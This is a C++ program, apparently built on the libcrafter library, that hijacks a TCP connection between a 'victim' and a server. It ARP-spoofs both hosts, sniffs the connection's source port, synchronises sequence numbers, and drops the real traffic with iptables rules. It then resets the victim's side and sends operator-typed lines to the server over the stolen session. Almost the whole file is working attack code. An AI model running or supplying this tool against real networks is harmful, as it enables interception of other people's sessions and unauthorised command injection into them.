#include <iostream>
#include <string>
#include <crafter.h>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

/*
 * This function add iptables roules to block the traffic between the victim and the server
 * of the connection we want to hijack
 */
void start_block(const string& dst_ip, const string& src_ip, int dst_port, int src_port);

void clear_block(const string& dst_ip, const string& src_ip, int dst_port, int src_port);

/* Put and clear IP forwarding */
void clear_forward();

/* Source port that we have to find out */
short_word srcport = 0;

void PacketHandler(Packet* sniff_packet, void* user) {

	/* Get the TCP layer from the packet */
	TCP* tcp_header = GetTCP(*sniff_packet);

	srcport = tcp_header->GetSrcPort();
}

int main() {

	/* Set the interface */
	string iface = "eth0";

	ip_forward();

	/* Set connection data */
	string dst_ip = "10.73.36.213"; // <-- Destination IP
	string src_ip = "10.73.36.200"; // <-- Spoof IP
	short_word dstport = 1234;     // <-- We know the spoofed IP connects to this port

	/* Begin the spoofing */
	ARPContext* arp_context = ARPSpoofingReply(dst_ip,src_ip,iface);

	/* Print some info */
	PrintARPContext(*arp_context);

	/* --------- Find out the source port... */

	/* IP stuff */
	string filter = "tcp and host "+ dst_ip +" and host " + src_ip;
	/* TCP stuff */
	filter += " and dst port " + StrPort(dstport);
	/* Launch the sniffer */
	Sniffer sniff(filter,iface,PacketHandler);
	sniff.Capture(1);

	cout << "[@] Detected a source port: " << srcport << endl;

	/* ------------------------------------- */

	/* TCP connection victim to server */
	TCPConnection tcp_v_to_s(src_ip,dst_ip,srcport,dstport,iface,TCPConnection::ESTABLISHED);
	/* TCP connection server to victim */
	TCPConnection tcp_s_to_v(dst_ip,src_ip,dstport,srcport,iface,TCPConnection::ESTABLISHED);
	/* Both connection are already established... */

	/* [+] Synchronize the ACK and SEQ numbers
	 * This will block the program until some TCP packets from the spoofed connection
	 * pass through your computer...
	 */
	tcp_v_to_s.Sync();
	tcp_s_to_v.Sync();

	cout << "[@] Connections synchronized " << endl;

	/* Give all this a second... */
	sleep(1);

	/* Start blocking the traffic of the spoofed connection */
	start_block(dst_ip,src_ip,dstport,srcport);

	/* Reset the connection to the victim */
	tcp_s_to_v.Reset();

	/* Now we communicate with the server from our console... */
	string line = "";
	string centinel = "QUITCONSOLE";
	while(line != centinel) {
		/* Get a line from standard input */
		getline(cin,line);
		/* Send to the destination */
		if(line != centinel) {
			line += "\n";
			tcp_v_to_s.Send(line.c_str());
		}
	}

	/* Close the spoofed connection with the server after we send our commands */
	tcp_v_to_s.Close();

	/* Clear everything */
	clear_block(dst_ip,src_ip,dstport,srcport);
    clear_forward();
	CleanARPContext(arp_context);

	return 0;
}

void ip_forward() {
    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
    system("/bin/echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects");
    system("iptables --append FORWARD --in-interface eth0 --jump ACCEPT");
}

void start_block(const string& dst_ip, const string& src_ip, int dst_port, int src_port) {

	/* Delete the forwarding... */
	system("iptables --delete FORWARD --in-interface eth0 --jump ACCEPT");

	/* Drop packets received from the spoofed connection */
	system(string("/sbin/iptables -A FORWARD -s " + dst_ip + " -d " + src_ip +
			      " -p tcp --sport " + StrPort(dst_port) + " --dport " + StrPort(src_port) +
			      " -j DROP").c_str());

	system(string("/sbin/iptables -A FORWARD -s " + src_ip + " -d " + dst_ip +
			      " -p tcp --sport " + StrPort(src_port) + " --dport " + StrPort(dst_port) +
			      " -j DROP").c_str());

	/* Append again the forwarding, so the victim can establish a new connection... */
	system("iptables --append FORWARD --in-interface eth0 --jump ACCEPT");

}

void clear_block(const string& dst_ip, const string& src_ip, int dst_port, int src_port) {
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");

	system(string("/sbin/iptables -D FORWARD -s " + dst_ip + " -d " + src_ip +
			      " -p tcp --sport " + StrPort(dst_port) + " --dport " + StrPort(src_port) +
			      " -j DROP").c_str());

	system(string("/sbin/iptables -D FORWARD -s " + src_ip + " -d " + dst_ip +
			      " -p tcp --sport " + StrPort(src_port) + " --dport " + StrPort(dst_port) +
			      " -j DROP").c_str());
}

void clear_forward() {
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
    system("iptables --delete FORWARD --in-interface eth0 --jump ACCEPT");
}
